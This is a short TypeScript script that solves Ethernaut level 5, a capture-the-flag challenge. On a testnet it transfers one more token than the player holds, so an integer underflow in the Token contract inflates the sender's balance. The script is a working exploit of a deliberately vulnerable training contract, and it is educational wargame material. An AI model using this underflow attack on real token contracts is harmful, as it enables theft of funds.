import TokenJSON from "../../../artifacts/contracts/level5/Token.sol/Token.json"
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const tokenContractAddress: string = process.env.INSTANCE_ADDRESS as string;


let prize: any;
let newPrize: any;

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 5 - script made by JoVi\n ------ \n`);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);

  const token = new ethers.Contract(tokenContractAddress, TokenJSON.abi, signer);

  console.log(`Fetching ${wallet.address}'s balance\n ------ \n`)
  const balance = await token.balanceOf(wallet.address);
  console.log(`${wallet.address}'s balance is : ${balance}\n ------ \n`)

  
  // deploy new attack contract
  console.log(`Attacking contract with a ${parseInt(balance) + 1} transfer attempt.\n ------ \n`)
  const attackTx = await token.transfer( "0xf7e956CE22F73E9FeF8aC920Eb5b9547893D353D", parseInt(balance) + 1)  //can put any address in here. The important part is the msg.sender receives fees.
  const attackTxReceipt = await attackTx.wait()
  console.log(`Attack succesfully attempted. ${attackTxReceipt}\n ------ \n`);

  
}


// Execute
main();